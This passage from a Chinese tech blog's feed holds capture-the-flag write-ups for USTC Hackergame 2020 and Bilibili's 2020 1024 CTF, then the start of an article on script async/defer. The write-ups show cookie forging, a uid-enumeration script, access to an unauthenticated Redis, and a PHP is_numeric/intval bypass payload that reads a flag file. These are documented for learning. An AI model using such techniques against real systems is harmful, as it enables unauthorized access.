Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span 